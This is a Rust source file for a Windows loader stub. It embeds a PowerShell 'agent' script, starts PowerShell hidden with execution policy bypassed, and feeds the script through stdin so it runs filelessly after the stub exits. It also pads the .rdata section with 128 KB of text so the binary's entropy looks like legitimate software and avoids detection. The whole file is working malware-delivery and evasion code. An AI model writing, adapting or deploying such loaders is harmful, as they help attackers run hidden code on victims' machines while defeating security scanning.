// EXE entry: spawn PowerShell with the embedded script via stdin pipe, then exit.
// PowerShell continues running independently as its own process.
#![windows_subsystem = "windows"]

// 128 KB of natural-language text placed directly in .rdata.
// Target: .rdata section entropy ≤ 5.5 b/B (legitimate range 4.0–5.5).
// Must use [u8; N] — &[u8] only moves the fat-pointer, not the payload bytes.
#[link_section = ".rdata"]
#[used]
static _PAD: [u8; 131072] = *include_bytes!(concat!(env!("OUT_DIR"), "/e.bin"));

fn main() {
    let _ = std::hint::black_box(_PAD.as_ptr());
    launch();
}

fn launch() {
    use std::io::Write;
    use std::os::windows::process::CommandExt;
    use std::process::{Command, Stdio};

    const SCRIPT: &[u8] = include_bytes!(env!("STRATUM_AGENT_PATH"));
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let exe_path = std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .into_owned();

    if let Ok(mut child) = Command::new("powershell.exe")
        .args([
            "-NonInteractive",
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass",
            "-Command", "-",
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(CREATE_NO_WINDOW)
        .env("_STUB_PATH", &exe_path)
        .spawn()
    {
        if let Some(mut stdin) = child.stdin.take() {
            let _ = stdin.write_all(SCRIPT);
            // dropping stdin closes the pipe → PS reads EOF → executes script
        }
        // don't wait: PS runs independently after our process exits
    }
}
